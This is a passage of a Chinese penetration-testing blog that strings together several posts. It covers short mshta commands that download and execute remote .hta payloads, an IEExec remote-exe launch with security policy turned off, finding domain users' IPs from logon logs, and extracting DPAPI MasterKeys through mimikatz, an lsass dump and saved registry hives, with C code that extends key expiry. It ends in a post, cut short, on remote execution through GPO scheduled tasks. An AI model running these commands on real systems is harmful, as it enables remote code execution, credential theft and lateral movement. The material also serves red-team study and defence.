<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta https://3gstudent.github.io/test/calc.hta
</code></pre></div></div>

<p>成功弹出计算器</p>

<p><strong>注:</strong></p>

<p>该思路来自于DM_</p>

<p>添加功能，实现下载执行，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta https://3gstudent.github.io/test/downloadexec.hta
</code></pre></div></div>

<p>弹框提示此计算机上的安全设置禁止访问其它域的数据源，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-1.png" alt="Alt text"></p>

<p><strong>解决方法：</strong></p>

<p><code class="language-plaintext highlighter-rouge">IE浏览器</code>-<code class="language-plaintext highlighter-rouge">Internet选项</code>-<code class="language-plaintext highlighter-rouge">安全</code></p>

<p>选择<code class="language-plaintext highlighter-rouge">可信站点</code>，添加博客地址：https://3gstudent.github.io/</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-2.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">自定义级别</code>，找到<code class="language-plaintext highlighter-rouge">通过域访问数据源</code>，选择<code class="language-plaintext highlighter-rouge">启用</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-3.png" alt="Alt text"></p>

<p>再次测试，成功实现下载执行的功能</p>

<p>经过以上的测试，我们发现IE浏览器默认会拦截vbs脚本实现的下载功能</p>

<p>那么，我们可以大胆猜测，如果下载执行换成powershell实现的话，那么就不会被拦截</p>

<p>修改脚本，上传至github</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta https://3gstudent.github.io/test/downloadexec2.hta
</code></pre></div></div>

<p>经过测试，该方法可用</p>

<p>使用短地址</p>

<p>有趣的是 http://dwz.cn/ 不支持该域名</p>

<p>换一个短地址网站 http://sina.lt/</p>

<p>生成短地址，最终命令为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta http://t.cn/RYUQyF8
</code></pre></div></div>

<p>最终实现的最短字符长度为25</p>

<h2 id="0x04-补充">0x04 补充</h2>
<hr>

<h3 id="1ieexec">1、IEExec</h3>

<p>需要管理员权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Windows\Microsoft.NET\Framework\v2.0.50727\
caspol -s off
IEExec http://github.com/3gstudent/test/raw/master/putty.exe
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>exe需要满足特定格式</p>

<p>详情可参考：</p>

<p>https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</p>

<p><strong>注：</strong></p>

<p>我在Win7下复现失败</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对通过cmd实现从github下载文件的方法做了汇总，最短的实现方式为<code class="language-plaintext highlighter-rouge">mshta http://t.cn/RYUQyF8</code></p>

<p>实现的最短字符长度为25</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 23, 2017
  </div>

  
</article><article class="post">
  <h1>SharpSniper利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>SharpSniper用于在域环境中找到指定域用户的IP地址，需要具有读取域控制器日志的权限，地址：https://github.com/HunnicCyber/SharpSniper</p>

<p>本文将要对SharpSniper的实现原理进行分析，扩展用法，分别介绍如何使用wevtutil.exe和powershell脚本实现相同的功能，分享其中需要注意的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>SharpSniper实现原理</li>
  <li>使用wevtutil实现</li>
  <li>使用powershell实现</li>
</ul>

<h2 id="0x02-sharpsniper实现原理">0x02 SharpSniper实现原理</h2>
<hr>

<p>通过查询域控制器上的用户登录日志(Event ID:4624)，获得域用户使用过的IP地址</p>

<p>具体实现如下：</p>

<h3 id="1通过查询日志获得域用户使用过的ip">1.通过查询日志获得域用户使用过的IP</h3>

<p>XPath查询条件(以查询用户testb为例)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"
</code></pre></div></div>

<p>对应代码地址：
https://github.com/HunnicCyber/SharpSniper/blob/master/QueryDC.cs#L16</p>

<h3 id="2通过正则表达式过滤出域用户使用过的ip">2.通过正则表达式过滤出域用户使用过的IP</h3>

<p>正则表达式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"
</code></pre></div></div>

<ul>
  <li>\b表示单词的前或后边界</li>
  <li>\d{1,3}表示字符个数在1到3位之间</li>
  <li>.表示匹配字符”.”</li>
</ul>

<p>对应代码地址：</p>

<p>https://github.com/HunnicCyber/SharpSniper/blob/master/Program.cs#L54</p>

<h2 id="0x03-使用wevtutil实现">0x03 使用wevtutil实现</h2>
<hr>

<h3 id="1查询指定用户以查询用户testb为例的登录日志">1.查询指定用户(以查询用户testb为例)的登录日志</h3>

<p>cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe security /format:text /q:"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"
</code></pre></div></div>

<p>包括每条日志的详细信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/2-1.png" alt="Alt text"></p>

<h3 id="2从详细信息中提取出ip">2.从详细信息中提取出ip</h3>

<p>这里可以借助<code class="language-plaintext highlighter-rouge">find</code>命令进行筛选</p>

<p>cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe security /format:text /q:"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"|find "Source Network Address"
</code></pre></div></div>

<p>筛选后的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/2-2.png" alt="Alt text"></p>

<p>从日志中提取出用户testb使用过的所有IP地址</p>

<h3 id="补充xpath查询条件的编写">补充：XPath查询条件的编写</h3>

<p>可以使用Event Viewer自动生成需要的XPath语句</p>

<p>1.打开Event Viewer</p>

<p>cmd执行：<code class="language-plaintext highlighter-rouge">eventvwr.msc</code></p>

<p>2.选择<code class="language-plaintext highlighter-rouge">Create Custom View..</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/3-1.png" alt="Alt text"></p>

<p>3.设置查询条件后选择XML标签</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/3-2.png" alt="Alt text"></p>

<p>自动生成需要的XPath语句，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/3-3.png" alt="Alt text"></p>

<p>4.使用wevtutil调用查询语句的两种方法</p>

<p>(1)按照/q参数的格式进行修改</p>

<p>需要提取自动生成的XPath语句中Select标签中的内容</p>

<p>(2)通过读取文件调用查询</p>

<p>直接使用自动生成的XPath语句</p>

<p>将步骤3中的查询语句保存到文件，例如custom1.xml</p>

<p>读取文件调用查询的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe custom1.xml /sq:true /rd:true /f:text
</code></pre></div></div>

<h2 id="0x04-使用powershell实现">0x04 使用powershell实现</h2>
<hr>

<h3 id="1查询指定用户以查询用户testb为例的登录日志-1">1.查询指定用户(以查询用户testb为例)的登录日志</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WinEvent -LogName "security" -FilterXPath "Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"|Format-List
</code></pre></div></div>

<p>包括每条日志的详细信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/4-1.png" alt="Alt text"></p>

<h3 id="2从详细信息中提取出ip的三种方法">2.从详细信息中提取出ip的三种方法</h3>

<h4 id="1使用find命令">(1)使用find命令</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WinEvent -LogName "security" -FilterXPath "Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"|Format-List|find "Source Network Address"
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/4-2.png" alt="Alt text"></p>

<h4 id="2通过正则表达式进行过滤">(2)通过正则表达式进行过滤</h4>

<p>第一种实现方法：</p>

<p>使用SharpSniper中的正则表达式，对应的powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$events = Get-WinEvent -LogName "security" -FilterXPath "Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"
$i=0
while ($i -lt $events.length) {
    $IP=[regex]::matches($events[$i].Message, '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')
    Write-Host $IP
    $i++
}
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/4-3.png" alt="Alt text"></p>

<p>第二种实现方法：</p>

<p>搜索关键词<code class="language-plaintext highlighter-rouge">"Source Network Address:"</code>，对应的powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$events = Get-WinEvent -LogName "security" -FilterXPath "Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"
$i=0
while ($i -lt $events.length) {
    $IP=[regex]::matches($events[$i].Message, 'Source Network Address:(.+)') | %{$_.Groups[1].Value.Trim()}
    Write-Host $IP
    $i++
}
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/4-4.png" alt="Alt text"></p>

<h4 id="3先转换成xml格式再进行筛选">(3)先转换成xml格式，再进行筛选</h4>

<p>在输出时，只有Message列，无法选择只输出”Source Network Address”的内容</p>

<p>这里如果将输出内容转换为xml格式，<code class="language-plaintext highlighter-rouge">"Source Network Address"</code>对应的列为<code class="language-plaintext highlighter-rouge">ipaddress</code></p>

<p>参考资料：</p>

<p>https://blog.51cto.com/beanxyz/1695288</p>

<p>对应的powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Events = Get-WinEvent -LogName "security" -FilterXPath "Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='testb']]"     
ForEach ($Event in $Events) {       
  $eventXML = [xml]$Event.ToXml()         
  For ($i=0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) {   
    Add-Member -InputObject $Event -MemberType NoteProperty -Force -Name $eventXML.Event.EventData.Data[$i].name -Value $eventXML.Event.EventData.Data[$i].'#text'     
  }       
}       
$events|select ipaddress
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-16/4-5.png" alt="Alt text"></p>

<h3 id="补充使用powershell调用自动生成的xpath查询条件">补充：使用powershell调用自动生成的XPath查询条件</h3>

<p>参照0x03中的内容，使用Event Viewer自动生成需要的XPath语句</p>

<p>直接保存在变量<code class="language-plaintext highlighter-rouge">$xml</code>中并进行调用，对应的powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$xml = @'

&lt;QueryList&gt;
  &lt;Query Id="0" Path="Security"&gt;
    &lt;Select Path="Security"&gt;*[System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &amp;lt;= 604800000]]]&lt;/Select&gt;
  &lt;/Query&gt;
&lt;/QueryList&gt;

'@

Get-WinEvent -FilterXml $xml
</code></pre></div></div>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文分析了SharpSniper的实现原理，扩展用法，分别介绍如何使用wevtutil.exe和powershell脚本实现相同的功能，可以用来获取域环境中关键用户使用过的IP。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 16, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——获取Windows系统下DPAPI中的MasterKey</h1>

  <div class="entry">
    <h2 id="0x00前言">0x00前言</h2>
<hr>

<p>对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容</p>

<ul>
  <li>基本概念</li>
  <li>获得MasterKey的方法</li>
  <li>解析Preferred文件</li>
  <li>修改MasterKey失效时间</li>
</ul>

<h2 id="0x02-基本概念">0x02 基本概念</h2>
<hr>

<h4 id="dpapi">DPAPI：</h4>

<p>全称Data Protection Application Programming Interface</p>

<p>作为Windows系统的一个数据保护接口被广泛使用</p>

<p>主要用于保护加密的数据，常见的应用如：</p>

<ul>
  <li>EFS文件加密</li>
  <li>存储无线连接密码</li>
  <li>Windows Credential Manager</li>
  <li>Internet Explorer</li>
  <li>Outlook</li>
  <li>Skype</li>
  <li>Windows CardSpace</li>
  <li>Windows Vault</li>
  <li>Google Chrome</li>
</ul>

<h4 id="master-key">Master Key：</h4>

<p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>

<h4 id="master-key-file">Master Key file：</h4>

<p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>

<p>分为两种：</p>

<ul>
  <li>用户Master Key file，位于%APPDATA%\Microsoft\Protect\%SID%</li>
  <li>系统Master Key file，位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</li>
</ul>

<h4 id="preferred文件">Preferred文件：</h4>

<p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期</p>

<h2 id="0x03-获得masterkey的方法">0x03 获得MasterKey的方法</h2>
<hr>

<p>本节主要介绍通过mimikatz获得MasterKey的方法</p>

<h3 id="1在线获取">1、在线获取</h3>

<p>通过读取Lsass进程信息，获取当前系统中的MasterKey，能获得多个Master Key file对应的MasterKey</p>

<p>管理员权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
sekurlsa::dpapi
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-2.png" alt="Alt text"></p>

<h3 id="2离线读取">2、离线读取</h3>

<h4 id="思路一">思路一：</h4>

<p>使用procdump dump出LSASS进程内存</p>

<p>管理员权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre></div></div>

<p>使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
</code></pre></div></div>

<h4 id="思路二">思路二：</h4>

<p>参考资料：</p>

<p>https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials</p>

<p>1、复制注册表文件</p>

<p>管理员权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SECURITY SECURITY.hiv
</code></pre></div></div>

<p>2、从注册表文件中获得DPAPI_SYSTEM</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz log "lsadump::secrets /system:SystemBkup.hiv /security:SECURITY.hiv"
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-3.png" alt="Alt text"></p>

<p>DPAPI_SYSTEM中的user hash为<code class="language-plaintext highlighter-rouge">c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3</code>，能够用来解密位于<code class="language-plaintext highlighter-rouge">%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</code>下的系统Master Key file</p>

<p>3、解密系统Master Key file，获得MasterKey</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz "dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\04ece708-132d-4bf0-a647-e3329269a012 /system:c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3"
</code></pre></div></div>

<p>解密获得MasterKey为<code class="language-plaintext highlighter-rouge">3e9d7f32f2e57933ead318d075efc82325697d87d992b626a20abb5f0ffba6f073d282a837b6fa058ecff36039aa944e04b3dfb666ebace44aad6bff8789ca43</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-4.png" alt="Alt text"></p>

<h2 id="0x04-解析preferred文件">0x04 解析Preferred文件</h2>
<hr>

<p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey file及其过期时间</p>

<p>格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _tagPreferredMasterKey
{
	GUID guidMasterKey;
	FILETIME ftCreated;
} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
</code></pre></div></div>

<p>例如<code class="language-plaintext highlighter-rouge">C:\Users\b\AppData\Roaming\Microsoft\Protect\S-1-5-21-2884853959-2080156797-250722187-1002\Preferred</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-1.png" alt="Alt text"></p>

<p>前16字节<code class="language-plaintext highlighter-rouge">F6 B0 11 A1 D7 B4 C8 40 B5 36 67 2A 82 88 B9 58</code>对应guid，调整格式后，对应文件为<code class="language-plaintext highlighter-rouge">a111b0f6-b4d7-40c8-b536-672a8288b958</code></p>

<p>后8字节<code class="language-plaintext highlighter-rouge">D0 08 9F 7D 11 EC D3 01</code>对应过期时间</p>

<p>对于表示时间的FILETIME，格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _FILETIME {  
                          DWORD dwLowDateTime;  
                          DWORD dwHighDateTime;  
} FILETIME, *PFILETIME;
</code></pre></div></div>

<p>想要显示成日常使用的时间格式，需要将FILETIME类型转成SYSTEMTIME类型</p>

<p>在程序实现上，还需要注意使用sscanf_s函数将字符串转换为DWORD格式</p>

<p>可供参考的C代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;

int main(void)  
{  
	FILE *fp;  
	unsigned char buf[24];
    fopen_s(&amp;fp,"Preferred","rb");  
    fread(buf,1,24,fp);
	printf("Data: ");
	for(int i=0;i&lt;24;i++)
	{
		printf("%02x",buf[i]);
	}
	fclose(fp);

	printf("\nguidMasterKey: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n",buf[3],buf[2],buf[1],buf[0],buf[5],buf[4],buf[7],buf[6],buf[8],buf[9],buf[10],buf[11],buf[12],buf[13],buf[14],buf[15]);

	char lowDateTime[9],highDateTime[9];
	sprintf_s(lowDateTime,9,"%02X%02X%02X%02X",buf[19],buf[18],buf[17],buf[16]);
	sprintf_s(highDateTime,9,"%02X%02X%02X%02X",buf[23],buf[22],buf[21],buf[20]);

	printf("dwLowDateTime:%s\n",lowDateTime);
	printf("dwHighDateTime:%s\n",highDateTime);

	FILETIME        ftUTC;
	SYSTEMTIME      stUTC2;
	sscanf_s(lowDateTime,"%x",&amp;ftUTC.dwLowDateTime);
	sscanf_s(highDateTime,"%x",&amp;ftUTC.dwHighDateTime);
	FileTimeToSystemTime(&amp;ftUTC, &amp;stUTC2);  
	printf("");
	printf("Expiry time: %d-%d-%d %d:%d:%d\n", stUTC2.wYear, stUTC2.wMonth, stUTC2.wDay, stUTC2.wHour, stUTC2.wMinute, stUTC2.wSecond);  

	return 0;  
} 
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>也可以使用fread读取int型数据来解决字符串倒序的问题</p>

<p>读取Preferred文件，解析出当前系统正在使用的Master Key file的guid和过期时间</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-2.png" alt="Alt text"></p>

<h2 id="0x05-修改masterkey失效时间">0x05 修改MasterKey失效时间</h2>
<hr>

<p>修改思路：</p>

<p>输入过期时间，将过期时间转为FILETIME格式，替换Preferred文件的FILETIME</p>

<p>可供参考的c代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;  
int main(void)  
{  
	SYSTEMTIME st={0};
	FILETIME   ft={0};
	printf("[+]Start to change expiry time...\n");	
	st.wYear = 2019;
	st.wMonth = 12;
	st.wDay = 30;
	st.wHour = 12;
	st.wMinute = 30;
	st.wSecond = 30;
	printf("[+]New expiry time:%d-%d-%d %d:%d:%d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	SystemTimeToFileTime(&amp;st,&amp;ft);
	printf("dwLowDateTime:%08x\n",ft.dwLowDateTime);
	printf("dwHighDateTime:%08x\n",ft.dwHighDateTime);

	FILE *fp;  
    fopen_s(&amp;fp,"Preferred","rb+");  
	fseek(fp,16,SEEK_SET);
    fwrite(&amp;ft.dwLowDateTime,sizeof(int),1,fp);
	fwrite(&amp;ft.dwHighDateTime,sizeof(int),1,fp);
	fclose(fp);
	printf("[+]Change success.\n");
	return 0;  
} 
</code></pre></div></div>

<p>读取Preferred文件，将过期时间设置为<code class="language-plaintext highlighter-rouge">2019-12-30 12:30:30</code></p>

<p>修改后重新读取Preferred文件信息，成功修改，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-3.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文总结了在获得了Windows系统的权限后获得MasterKey的方法，编写程序自动分析Preferred文件格式并延长MasterKey的有效期</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 17, 2018
  </div>

  
</article><article class="post">
  <h1>域渗透——利用GPO中的计划任务实现远程执行(命令行实现原理与脚本细节)</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a>介绍了利用GPO中的计划任务实现远程执行的方法，分析利用思路，通过命令行实现了GPO和计划任务的创建、修改和删除。</p>

<p>这篇文章将要详细介绍命令行实现的原理和脚本的开发细节，记录定位问题和解决问题的过程。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>定位问题</li>
  <li>解决思路</li>
  <li>脚本实现细节</li>
</ul>

<h2 id="0x02-定位问题">0x02 定位问题</h2>
<hr>

<p>测试环境:Windows Server 2008 R2</p>

<p>domain:test.com</p>

<h3 id="测试1">测试1</h3>

<p>通过Group Policy Management Console (GPMC) 创建GPO，添加计划任务(Immediate Task)</p>

<p>成功实现计划任务的远程执行</p>

<h3 id="测试2">测试2：</h3>

<p>使用命令行实现创建GPO并添加计划任务(Immediate Task)，步骤如下：</p>

<h4 id="1创建一个gpo">1、创建一个GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new-gpo -name TestGPO1 | new-gplink -Target "dc=test,dc=com"
</code></pre></div></div>

<p>GpoId为<code class="language-plaintext highlighter-rouge">d7dacd95-883c-402f-9238-9e2643f8f309</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/2-1.png" alt="Alt text"></p>

<h4 id="2创建计划任务的配置文件scheduledtasksxml">2、创建计划任务的配置文件ScheduledTasks.xml</h4>

<p>路径为:<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\Policies\{D7DACD95-883C-402F-9238-9E2643F8F309}\User\Preferences\ScheduledTasks</code></p>

<p>ScheduledTasks.xml的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"&gt;
&lt;ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="debug" image="0" changed="2018-12-11 11:11:11" uid="{92272F3D-762C-460A-94FA-F3E3B9EBACF0}" userContext="0" removePolicy="0"&gt;
&lt;Properties action="C" name="debug" runAs="%LogonDomain%\%LogonUser%" logonType="InteractiveToken"&gt;
&lt;Task version="1.2"&gt;
&lt;RegistrationInfo&gt;
&lt;Author&gt;NT AUTHORITY\System&lt;/Author&gt;
&lt;Description/&gt;
&lt;/RegistrationInfo&gt;
&lt;Principals&gt;
&lt;Principal id="Author"&gt;
&lt;UserId&gt;%LogonDomain%\%LogonUser%&lt;/UserId&gt;
&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
&lt;/Principal&gt;
&lt;/Principals&gt;
&lt;Settings&gt;
&lt;IdleSettings&gt;
&lt;Duration&gt;PT5M&lt;/Duration&gt;
&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
&lt;StopOnIdleEnd&gt;false&lt;/StopOnIdleEnd&gt;
&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
&lt;/IdleSettings&gt;
&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
&lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
&lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
&lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
&lt;AllowStartOnDemand&gt;false&lt;/AllowStartOnDemand&gt;
&lt;Enabled&gt;true&lt;/Enabled&gt;
&lt;Hidden&gt;true&lt;/Hidden&gt;
&lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
&lt;Priority&gt;7&lt;/Priority&gt;
&lt;DeleteExpiredTaskAfter&gt;PT0S&lt;/DeleteExpiredTaskAfter&gt;
&lt;/Settings&gt;
&lt;Triggers&gt;
&lt;TimeTrigger&gt;
&lt;StartBoundary&gt;%LocalTimeXmlEx%&lt;/StartBoundary&gt;
&lt;EndBoundary&gt;%LocalTimeXmlEx%&lt;/EndBoundary&gt;
&lt;Enabled&gt;true&lt;/Enabled&gt;
&lt;/TimeTrigger&gt;
&lt;/Triggers&gt;
&lt;Actions&gt;
&lt;Exec&gt;
&lt;Command&gt;powershell&lt;/Command&gt;
&lt;Arguments&gt;-c "123 | Out-File C:\test\debug.txt"&lt;/Arguments&gt;
&lt;/Exec&gt;
&lt;/Actions&gt;
&lt;/Task&gt;
&lt;/Properties&gt;
&lt;/ImmediateTaskV2&gt;
&lt;/ScheduledTasks&gt;
</code></pre></div></div>

<h4 id="3通过group-policy-management-console-gpmc-查看gpo的配置">3、通过Group Policy Management Console (GPMC) 查看GPO的配置</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/2-2.png" alt="Alt text"></p>

<p>可以发现，只要创建文件ScheduledTasks.xml，就可以在Group Policy Management Console (GPMC)中的Scheduled Tasks显示添加的计划任务</p>

<p>但是，此时并不能实现计划任务的远程执行</p>

<p>经过以下操作证明了还缺少计划任务的注册操作：</p>

<p>进入Group Policy Management Console (GPMC)中的Scheduled Tasks</p>

<p>修改任意一项配置</p>

<p>选择Apply</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/2-3.png" alt="Alt text"></p>

<p>再次测试，发现创建的计划任务能够实现远程执行</p>

<h4 id="结论">结论：</h4>

<p>创建计划任务的配置文件<code class="language-plaintext highlighter-rouge">ScheduledTasks.xml</code>后，还需要注册操作才能使新添加的Scheduled Tasks生效</p>

<h2 id="0x03-解决思路">0x03 解决思路</h2>
<hr>

<p>GPO支持的命令如下：</p>

<p>https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=win10-ps</p>

<p>目前，我还没有找到关于注册计划任务的方法</p>

<p>但我有一些猜测：</p>

<p>备份GPO的时候会不会保存注册信息？如果会，那么先备份GPO，向备份文件中添加注册信息，再还原GPO，能否变相实现GPO的注册？</p>

<p>开始接下来的测试：</p>

<h4 id="1备份gpo">1、备份GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup-Gpo -Name TestGPO1 -Path C:\test
</code></pre></div></div>

<p>如下图</p>

